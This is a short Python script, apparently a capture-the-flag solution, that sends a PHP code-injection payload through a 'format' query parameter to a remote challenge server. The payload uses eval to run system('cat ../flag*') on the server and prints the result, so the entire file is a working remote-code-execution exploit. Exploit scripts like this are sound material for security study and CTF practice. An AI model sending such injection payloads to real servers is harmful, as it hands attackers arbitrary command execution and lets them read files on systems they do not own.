import requests
# host = '127.0.0.1'
host = '165.227.225.205'
# port = '1337'
port = '31825'
query = '?format='
poison = "${eval($_GET[1])}&1=system('cat ../flag*');die();"
url = f'http://{host}:{port}{query}{poison}'
res = requests.get(url)
print(res.text)